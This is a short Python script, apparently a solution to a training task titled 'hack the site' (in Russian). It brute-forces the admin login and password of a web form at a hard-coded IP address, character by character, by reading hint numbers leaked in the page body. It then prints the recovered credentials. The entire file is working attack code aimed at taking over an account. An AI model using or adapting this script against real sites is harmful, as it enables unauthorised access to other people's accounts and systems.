# task5:
# Взломать сайт

from requests import post


def get_length(url, data):
    request = post(url, data)
    response_content = request.text[request.text.rindex('<body>') + 6:request.text.index('</body>')].strip()
    return int(response_content[57:59]) + 1


def brutforce_func(length, url, data, flag, chars='1234567890_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'):
    combination = ['a' for _ in range(length)]
    prev_hint = 0
    for i in range(length):
        for char in chars:
            combination[i] = char
            key = ''.join(combination)
            data[flag] = key
            request = post(url, data)
            if flag == 'login':
                try:
                    hint = int(request.text[request.text.rindex('<body>')+6:request.text.index('</body>')].strip()[30:32].strip())
                except ValueError:
                    return key
            else:
                hint = int(request.text[request.text.rindex('<body>')+6:request.text.index('</body>')].strip()[-9:-11:-1].strip())
                if hint == 24:
                    return key

            if hint != prev_hint:
                prev_hint = hint
                break


if __name__ == '__main__':
    url = 'http://213.178.59.123:8000/admin_auth'
    data = {'login': '1', 'password': '1'}

    login_length = get_length(url, data)
    data['login'] = brutforce_func(login_length, url, data, 'login')

    psw_length = get_length(url, data)
    data['password'] = brutforce_func(psw_length, url, data, 'password')

    print('Сайт взломан.\nlogin - {}\npassword - {}'.format(data['login'], data['password']))

# Результат:
#